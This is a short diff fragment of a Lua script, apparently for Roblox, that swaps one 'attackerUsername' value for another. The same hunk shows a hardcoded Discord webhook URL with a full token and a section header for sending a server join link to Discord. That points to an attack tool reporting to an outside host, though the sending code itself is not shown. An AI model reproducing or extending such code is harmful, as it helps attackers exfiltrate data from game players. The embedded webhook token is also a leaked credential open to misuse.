@@ -5,7 +5,7 @@
 --]]
 
 local webhookURL = "https://discord.com/api/webhooks/1532509426257236008/TQrtSPyEYviVXAPzhBbVgaPIRcKFLHghPCxBfD3TFQ7njWBM7qngokItqz0vCXkiCkcz"   -- REPLACE THIS
-local attackerUsername = "FEARACCE" -- REPLACE THIS
+local attackerUsername = "zerotilzed1" -- REPLACE THIS
 
 -- ========================================
 -- COMPONENT A: Send server join link to Discord
